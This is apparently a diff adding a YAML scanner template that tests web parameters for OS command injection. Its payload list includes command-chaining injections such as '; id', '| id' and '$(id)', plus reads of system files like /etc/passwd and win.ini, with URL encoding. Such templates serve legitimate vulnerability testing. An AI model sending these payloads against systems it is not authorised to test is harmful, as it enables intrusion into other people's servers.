@@ -1,0 +1,56 @@
+# templates/command-injection/command-injection-basic.yaml
+id: command-injection-basic
+info:
+  name: Command Injection Vulnerability
+  author: shadowxp
+  severity: critical
+  description: Tests for OS command injection vulnerabilities
+  tags:
+    - command-injection
+    - rce
+    - critical
+
+vulnerability_type: command-injection
+
+request:
+  - method: GET
+    path: "{{BaseURL}}?{{parameter}}={{command_payload}}"
+    
+    matchers:
+      - type: word
+        words:
+          - "uid="
+          - "gid="
+          - "root"
+          - "daemon"
+          - "bin"
+        part: body
+      - type: regex
+        regex:
+          - "drwxr-xr-x"
+          - "total [0-9]+"
+        part: body
+
+payloads:
+  # Linux/Unix commands
+  - "id"
+  - "whoami"
+  - "ls -la"
+  - "cat /etc/passwd"
+  - "uname -a"
+  # Windows commands
+  - "dir"
+  - "type c:\\windows\\win.ini"
+  - "whoami"
+  - "systeminfo"
+  # Command chaining
+  - "; id"
+  - "| id"
+  - "&& id"
+  - "|| id"
+  - "`id`"
+  - "$(id)"
+
+encoders:
+  - url
+  - double_url
